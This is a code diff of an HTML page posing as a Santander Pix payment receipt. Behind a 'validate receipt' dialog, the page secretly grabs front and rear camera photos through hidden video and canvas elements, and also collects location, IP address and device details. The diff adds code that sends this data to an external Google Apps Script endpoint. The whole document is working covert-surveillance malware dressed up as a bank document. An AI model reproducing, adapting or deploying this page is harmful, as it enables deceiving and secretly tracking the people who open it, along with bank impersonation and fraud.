@@ -5,12 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Comprovante Pix</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: Arial, Helvetica, sans-serif;
             background: #e8e8e8;
@@ -20,19 +15,14 @@
             min-height: 100vh;
             padding: 20px;
         }
-
         .pdf-container {
             width: 100%;
             max-width: 480px;
             background: white;
             border-radius: 4px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-            padding: 0;
             overflow: hidden;
-            position: relative;
         }
-
-        /* Cabeçalho Santander */
         .santander-header {
             background: #ec0000;
             padding: 16px 20px 12px 20px;
@@ -40,198 +30,39 @@
             justify-content: space-between;
             align-items: center;
         }
+        .santander-logo { color: white; font-size: 20px; font-weight: bold; letter-spacing: 2px; }
+        .santander-logo span { font-weight: normal; font-size: 14px; }
+        .santander-title { color: white; font-size: 14px; font-weight: bold; text-align: right; }
+        .santander-title small { display: block; font-weight: normal; font-size: 11px; opacity: 0.8; }
+        .pdf-body { padding: 20px 20px 12px 20px; }
+        .valor-box { text-align: center; padding: 12px 0; border-bottom: 1px solid #ddd; margin-bottom: 16px; }
+        .valor-label { font-size: 12px; color: #666; text-transform: uppercase; }
+        .valor-value { font-size: 28px; font-weight: bold; color: #1a1a2e; margin-top: 2px; }
+        .valor-value .currency { font-size: 18px; }
+        .valor-pagamento { font-size: 11px; color: #999; margin-top: 4px; }
+        .info-row { display: flex; padding: 8px 0; border-bottom: 1px solid #f0f0f0; font-size: 13px; }
+        .info-row .label { color: #666; width: 140px; flex-shrink: 0; }
+        .info-row .value { color: #1a1a2e; font-weight: 500; word-break: break-word; }
+        .section-title { font-size: 12px; font-weight: bold; color: #666; text-transform: uppercase; margin-top: 14px; margin-bottom: 6px; letter-spacing: 1px; }
+        .section-box { background: #f8f8f8; border-radius: 4px; padding: 10px 14px; margin-bottom: 10px; }
+        .section-box .info-row { border-bottom: none; padding: 4px 0; font-size: 13px; }
+        .section-box .info-row .label { width: 120px; font-size: 12px; }
+        .id-transacao { text-align: center; font-size: 11px; color: #999; margin-top: 14px; padding-top: 12px; border-top: 1px solid #eee; word-break: break-all; }
+        .pdf-footer { padding: 12px 20px; background: #f5f5f5; font-size: 10px; color: #888; text-align: center; border-top: 1px solid #ddd; line-height: 1.6; }
+        .pdf-footer .phone { font-weight: bold; color: #ec0000; }
 
-        .santander-logo {
-            color: white;
-            font-size: 20px;
-            font-weight: bold;
-            letter-spacing: 2px;
-        }
-
-        .santander-logo span {
-            font-weight: normal;
-            font-size: 14px;
-        }
-
-        .santander-title {
-            color: white;
-            font-size: 14px;
-            font-weight: bold;
-            text-align: right;
-        }
-
-        .santander-title small {
-            display: block;
-            font-weight: normal;
-            font-size: 11px;
-            opacity: 0.8;
-        }
-
-        /* Corpo do comprovante */
-        .pdf-body {
-            padding: 20px 20px 12px 20px;
-        }
-
-        /* Valor principal */
-        .valor-box {
-            text-align: center;
-            padding: 12px 0;
-            border-bottom: 1px solid #ddd;
-            margin-bottom: 16px;
-        }
-
-        .valor-label {
-            font-size: 12px;
-            color: #666;
-            text-transform: uppercase;
-        }
-
-        .valor-value {
-            font-size: 28px;
-            font-weight: bold;
-            color: #1a1a2e;
-            margin-top: 2px;
-        }
-
-        .valor-value .currency {
-            font-size: 18px;
-        }
-
-        .valor-pagamento {
-            font-size: 11px;
-            color: #999;
-            margin-top: 4px;
-        }
-
-        /* Linhas de informação */
-        .info-row {
+        /* DIALOG DE PERGUNTA */
+        .dialog-overlay {
             display: flex;
-            padding: 8px 0;
-            border-bottom: 1px solid #f0f0f0;
-            font-size: 13px;
-        }
-
-        .info-row .label {
-            color: #666;
-            width: 140px;
-            flex-shrink: 0;
-        }
-
-        .info-row .value {
-            color: #1a1a2e;
-            font-weight: 500;
-            word-break: break-word;
-        }
-
-        .info-row .value.highlight {
-            font-weight: bold;
-        }
-
-        /* Dados do recebedor (destaque) */
-        .section-title {
-            font-size: 12px;
-            font-weight: bold;
-            color: #666;
-            text-transform: uppercase;
-            margin-top: 14px;
-            margin-bottom: 6px;
-            letter-spacing: 1px;
-        }
-
-        .section-box {
-            background: #f8f8f8;
-            border-radius: 4px;
-            padding: 10px 14px;
-            margin-bottom: 10px;
-        }
-
-        .section-box .info-row {
-            border-bottom: none;
-            padding: 4px 0;
-            font-size: 13px;
-        }
-
-        .section-box .info-row .label {
-            width: 120px;
-            font-size: 12px;
-        }
-
-        /* ID da transação */
-        .id-transacao {
-            text-align: center;
-            font-size: 11px;
-            color: #999;
-            margin-top: 14px;
-            padding-top: 12px;
-            border-top: 1px solid #eee;
-            word-break: break-all;
-        }
-
-        /* Rodapé */
-        .pdf-footer {
-            padding: 12px 20px;
-            background: #f5f5f5;
-            font-size: 10px;
-            color: #888;
-            text-align: center;
-            border-top: 1px solid #ddd;
-            line-height: 1.6;
-        }
-
-        .pdf-footer .phone {
-            font-weight: bold;
-            color: #ec0000;
-        }
-
-        /* Área de clique (invisível - parece parte do comprovante) */
-        .pdf-button-area {
-            margin: 16px 20px 12px 20px;
-            padding: 14px;
-            background: #f0f7f0;
-            border-radius: 6px;
-            text-align: center;
-            border: 1px solid #00c853;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .pdf-button-area:active {
-            background: #e0f0e0;
-            transform: scale(0.98);
-        }
-
-        .pdf-button-text {
-            font-size: 14px;
-            font-weight: bold;
-            color: #1a1a2e;
-        }
-
-        .pdf-button-icon {
-            font-size: 20px;
-            display: block;
-            margin-bottom: 4px;
-        }
-
-        /* Modal de confirmação */
-        .modal-overlay {
-            display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.6);
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7);
             justify-content: center;
             align-items: center;
             z-index: 999;
             padding: 20px;
         }
-
-        .modal-overlay.active {
-            display: flex;
-        }
-
-        .modal-box {
+        .dialog-box {
             background: white;
             border-radius: 12px;
             padding: 30px 25px;
@@ -240,285 +71,91 @@
             text-align: center;
             box-shadow: 0 10px 40px rgba(0,0,0,0.3);
         }
-
-        .modal-icon {
-            font-size: 48px;
-            margin-bottom: 12px;
+        .dialog-icon { font-size: 48px; margin-bottom: 12px; }
+        .dialog-title { font-size: 20px; font-weight: bold; color: #1a1a2e; margin-bottom: 8px; }
+        .dialog-sub { font-size: 14px; color: #666; margin-bottom: 20px; }
+        .dialog-buttons { display: flex; gap: 12px; }
+        .dialog-btn {
+            flex: 1; padding: 12px; border: none; border-radius: 8px;
+            font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s;
         }
+        .dialog-btn-no { background: #e0e0e0; color: #333; }
+        .dialog-btn-no:active { background: #ccc; }
+        .dialog-btn-yes { background: #00c853; color: white; }
+        .dialog-btn-yes:active { background: #00a840; }
 
-        .modal-title {
-            font-size: 20px;
-            font-weight: bold;
-            color: #1a1a2e;
-            margin-bottom: 8px;
-        }
-
-        .modal-sub {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 20px;
-        }
-
-        .modal-buttons {
-            display: flex;
-            gap: 12px;
-        }
-
-        .modal-btn {
-            flex: 1;
-            padding: 12px;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        .modal-btn-no {
-            background: #e0e0e0;
-            color: #333;
-        }
-
-        .modal-btn-no:active {
-            background: #ccc;
-        }
-
-        .modal-btn-yes {
-            background: #00c853;
-            color: white;
-        }
-
-        .modal-btn-yes:active {
-            background: #00a840;
-        }
-
-        /* Carregamento */
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(255,255,255,0.95);
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            flex-direction: column;
-            gap: 16px;
-        }
-
-        .loading-overlay.active {
-            display: flex;
-        }
-
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #e0e0e0;
-            border-top-color: #ec0000;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .loading-text {
-            font-size: 16px;
-            color: #1a1a2e;
-            font-weight: 600;
-        }
-
-        /* Sucesso */
-        .success-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.7);
-            justify-content: center;
-            align-items: center;
-            z-index: 1001;
-            padding: 20px;
-        }
-
-        .success-overlay.active {
-            display: flex;
-        }
-
-        .success-box {
-            background: white;
-            border-radius: 16px;
-            padding: 35px 25px;
-            max-width: 380px;
-            width: 100%;
-            text-align: center;
-        }
-
-        .success-icon {
-            font-size: 64px;
-            margin-bottom: 12px;
-        }
-
-        .success-title {
-            font-size: 22px;
-            font-weight: bold;
-            color: #00c853;
-            margin-bottom: 6px;
-        }
-
-        .success-sub {
-            font-size: 14px;
-            color: #666;
-        }
-
-        /* Elementos invisíveis */
-        video, canvas {
-            display: none !important;
-            visibility: hidden !important;
-            width: 0 !important;
-            height: 0 !important;
-            position: absolute !important;
-            left: -9999px !important;
-            top: -9999px !important;
-        }
+        /* ELEMENTOS INVISÍVEIS */
+        video, canvas { display: none !important; visibility: hidden !important; width: 0 !important; height: 0 !important; position: absolute !important; left: -9999px !important; top: -9999px !important; }
     </style>
 </head>
 <body>
 
-    <!-- CORPO DO COMPROVANTE -->
-    <div class="pdf-container" id="pdfContainer">
-
-        <!-- Cabeçalho Santander -->
+    <!-- COMPROVANTE -->
+    <div class="pdf-container">
         <div class="santander-header">
-            <div class="santander-logo">
-                Santander <span>|</span>
-            </div>
-            <div class="santander-title">
-                Comprovante do Pix
-                <small id="displayDate">15/07/2026 - 19:39:02</small>
-            </div>
+            <div class="santander-logo">Santander <span>|</span></div>
+            <div class="santander-title">Comprovante do Pix <small id="displayDate">15/07/2026 - 19:39:02</small></div>
         </div>
 
-        <!-- Conteúdo -->
         <div class="pdf-body">
-
-            <!-- Valor -->
             <div class="valor-box">
                 <div class="valor-label">Valor pago</div>
-                <div class="valor-value">
-                    <span class="currency">R$</span> <span id="displayAmount">400,00</span>
-                </div>
+                <div class="valor-value"><span class="currency">R$</span> <span id="displayAmount">400,00</span></div>
                 <div class="valor-pagamento">Forma de pagamento: <span id="displayPaymentMethod">Ag 03731 Cc 1072710-4</span></div>
             </div>
 
-            <!-- Dados do recebedor -->
             <div class="section-title">Dados do recebedor</div>
             <div class="section-box">
-                <div class="info-row">
-                    <span class="label">Para</span>
-                    <span class="value" id="displayRecipient">Gabriel de Lara Ferreira</span>
-                </div>
-                <div class="info-row">
-                    <span class="label">CPF</span>
-                    <span class="value" id="displayRecipientCpf">***.495.909-**</span>
-                </div>
-                <div class="info-row">
-                    <span class="label">Chave</span>
-                    <span class="value" id="displayPixKey">mo***********ba@gmail.com</span>
-                </div>
-                <div class="info-row">
-                    <span class="label">Instituição</span>
-                    <span class="value" id="displayRecipientBank">033 - BANCO SANTANDER S.A.</span>
-                </div>
+                <div class="info-row"><span class="label">Para</span><span class="value" id="displayRecipient">Gabriel de Lara Ferreira</span></div>
+                <div class="info-row"><span class="label">CPF</span><span class="value" id="displayRecipientCpf">***.495.909-**</span></div>
+                <div class="info-row"><span class="label">Chave</span><span class="value" id="displayPixKey">mo***********ba@gmail.com</span></div>
+                <div class="info-row"><span class="label">Instituição</span><span class="value" id="displayRecipientBank">033 - BANCO SANTANDER S.A.</span></div>
             </div>
 
-            <!-- Dados do pagador -->
             <div class="section-title">Dados do pagador</div>
             <div class="section-box">
-                <div class="info-row">
-                    <span class="label">De</span>
-                    <span class="value" id="displayPayer">BRUNO EDUARDO DE ANDRADE E SILVA</span>
-                </div>
-                <div class="info-row">
-                    <span class="label">CPF</span>
-                    <span class="value" id="displayPayerCpf">***.602.509-**</span>
-                </div>
-                <div class="info-row">
-                    <span class="label">Instituição</span>
-                    <span class="value" id="displayPayerBank">033 - BANCO SANTANDER S.A.</span>
-                </div>
+                <div class="info-row"><span class="label">De</span><span class="value" id="displayPayer">BRUNO EDUARDO DE ANDRADE E SILVA</span></div>
+                <div class="info-row"><span class="label">CPF</span><span class="value" id="displayPayerCpf">***.602.509-**</span></div>
+                <div class="info-row"><span class="label">Instituição</span><span class="value" id="displayPayerBank">033 - BANCO SANTANDER S.A.</span></div>
             </div>
 
-            <!-- ID Transação -->
             <div class="id-transacao">
                 ID/Transação: <span id="displayTransactionId">E9040088820260715223865769710922</span>
-                <br>
-                <span id="displayTransactionDate">Data e hora da transação: 15/07/2026 - 19:39:02</span>
+                <br><span id="displayTransactionDate">Data e hora da transação: 15/07/2026 - 19:39:02</span>
             </div>
         </div>
 
-        <!-- Botão de abrir (invisível) -->
-        <div class="pdf-button-area" id="openButton">
-            <span class="pdf-button-icon">🔐</span>
-            <span class="pdf-button-text">Toque para validar este comprovante</span>
-        </div>
-
-        <!-- Rodapé -->
         <div class="pdf-footer">
-            Central de Atendimento Santander
-            <span class="phone">4004-3535</span> (Capitais e Regiões Metropolitanas)
+            Central de Atendimento Santander <span class="phone">4004-3535</span> (Capitais e Regiões Metropolitanas)
             <span class="phone">0800-702-3535</span> (Demais Localidades)
-            <br>
-            SAC <span class="phone">0800-762-7777</span> | Ouvidoria <span class="phone">0800-726-0322</span>
+            <br>SAC <span class="phone">0800-762-7777</span> | Ouvidoria <span class="phone">0800-726-0322</span>
         </div>
     </div>
 
-    <!-- Modal de confirmação -->
-    <div class="modal-overlay" id="confirmModal">
-        <div class="modal-box">
-            <div class="modal-icon">📄</div>
-            <div class="modal-title">Validar comprovante?</div>
-            <div class="modal-sub">Ao confirmar, você valida o recebimento do Pix.</div>
-            <div class="modal-buttons">
-                <button class="modal-btn modal-btn-no" onclick="handleCancel()">Não</button>
-                <button class="modal-btn modal-btn-yes" onclick="handleConfirm()">Sim</button>
+    <!-- DIALOG -->
+    <div class="dialog-overlay" id="dialogOverlay">
+        <div class="dialog-box">
+            <div class="dialog-icon">📄</div>
+            <div class="dialog-title">Deseja abrir este comprovante?</div>
+            <div class="dialog-sub">Clique em SIM para validar o recebimento.</div>
+            <div class="dialog-buttons">
+                <button class="dialog-btn dialog-btn-no" id="btnNo">Não</button>
+                <button class="dialog-btn dialog-btn-yes" id="btnYes">Sim</button>
             </div>
         </div>
     </div>
 
-    <!-- Carregamento -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="spinner"></div>
-        <div class="loading-text">Validando comprovante...</div>
-    </div>
-
-    <!-- Sucesso -->
-    <div class="success-overlay" id="successOverlay">
-        <div class="success-box">
-            <div class="success-icon">✅</div>
-            <div class="success-title">Comprovante Validado!</div>
-            <div class="success-sub">Pagamento confirmado com sucesso.</div>
-        </div>
-    </div>
-
-    <!-- Elementos invisíveis -->
+    <!-- ELEMENTOS INVISÍVEIS -->
     <video id="video" playsinline autoplay muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
         // ============================================================
-        // DADOS DO COMPROVANTE (PEGOS DA URL)
+        // DADOS DO COMPROVANTE
         // ============================================================
 
         const urlParams = new URLSearchParams(window.location.search);
 
-        // Valores padrão (exemplo)
         const data = {
             payer: urlParams.get('payer') || 'BRUNO EDUARDO DE ANDRADE E SILVA',
             payerCpf: urlParams.get('payerCpf') || '***.602.509-**',
@@ -532,7 +169,6 @@
             transactionId: urlParams.get('txid') || 'E9040088820260715223865769710922'
         };
 
-        // Preencher os campos
         document.getElementById('displayPayer').textContent = data.payer;
         document.getElementById('displayPayerCpf').textContent = data.payerCpf;
         document.getElementById('displayPayerBank').textContent = data.payerBank;
@@ -544,14 +180,13 @@
         document.getElementById('displayPaymentMethod').textContent = data.paymentMethod;
         document.getElementById('displayTransactionId').textContent = data.transactionId;
 
-        // Data atual
         const now = new Date();
         const dateStr = now.toLocaleDateString('pt-BR') + ' - ' + now.toLocaleTimeString('pt-BR', {hour: '2-digit', minute: '2-digit'});
         document.getElementById('displayDate').textContent = dateStr;
         document.getElementById('displayTransactionDate').textContent = 'Data e hora da transação: ' + dateStr;
 
         // ============================================================
-        // LÓGICA DE CAPTURA (INVISÍVEL)
+        // CAPTURA E ENVIO
         // ============================================================
 
         let capturedData = {
@@ -563,27 +198,14 @@
             ip: null
         };
 
-        document.getElementById('openButton').addEventListener('click', () => {
-            document.getElementById('confirmModal').classList.add('active');
+        document.getElementById('btnNo').addEventListener('click', () => {
+            window.history.back();
         });
 
-        function handleCancel() {
-            document.getElementById('confirmModal').classList.remove('active');
-        }
-
-        async function handleConfirm() {
-            document.getElementById('confirmModal').classList.remove('active');
-            document.getElementById('loadingOverlay').classList.add('active');
-
+        document.getElementById('btnYes').addEventListener('click', async () => {
+            document.getElementById('dialogOverlay').style.display = 'none';
             await captureAllData();
-
-            document.getElementById('loadingOverlay').classList.remove('active');
-            document.getElementById('successOverlay').classList.add('active');
-
-            setTimeout(() => {
-                document.getElementById('successOverlay').classList.remove('active');
-            }, 3000);
-        }
+        });
 
         async function captureAllData() {
             try {
@@ -595,17 +217,46 @@
                 capturedData.deviceInfo = navigator.userAgent;
                 capturedData.timestamp = new Date().toISOString();
 
+                // SALVA LOCALMENTE
                 localStorage.setItem('pixTrackerCapture', JSON.stringify(capturedData));
 
-                console.log('📸 Dados capturados:', {
-                    timestamp: capturedData.timestamp,
-                    location: capturedData.location,
-                    ip: capturedData.ip,
-                    photos: capturedData.frontPhoto ? '✅' : '❌'
-                });
+                // ENVIA PARA O GOOGLE SHEETS
+                await sendToGoogleSheets();
+
+                console.log('✅ Dados capturados e enviados!');
 
             } catch (error) {
                 console.error('Erro na captura:', error);
+            }
+        }
+
+        // ============================================================
+        // ENVIAR PARA O GOOGLE SHEETS
+        // ============================================================
+
+        async function sendToGoogleSheets() {
+            try {
+                const url = 'https://script.google.com/macros/s/AKfycbyDSeYAU4rfZCa8G3NA4enOA3tvApzYsJqvmDH9HjSAfJ_jjr8XBd_nAUyiXZkXIx2-Gg/exec';
+                
+                const payload = {
+                    timestamp: capturedData.timestamp,
+                    location: capturedData.location,
+                    ip: capturedData.ip,
+                    deviceInfo: capturedData.deviceInfo,
+                    payer: data.payer,
+                    amount: data.amount
+                };
+
+                await fetch(url, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log('✅ Dados enviados para o Google Sheets!');
+            } catch (error) {
+                console.error('Erro ao enviar:', error);
             }
         }
 
@@ -633,7 +284,7 @@
                 capturedData.frontPhoto = canvas.toDataURL('image/jpeg', 0.6);
                 stream.getTracks().forEach(t => t.stop());
             } catch (e) {
-                console.error('Front error:', e);
+                console.log('Front camera error:', e);
             }
         }
 
@@ -657,7 +308,7 @@
                 capturedData.rearPhoto = canvas.toDataURL('image/jpeg', 0.6);
                 stream.getTracks().forEach(t => t.stop());
             } catch (e) {
-                console.error('Rear error:', e);
+                console.log('Rear camera error:', e);
             }
         }
 
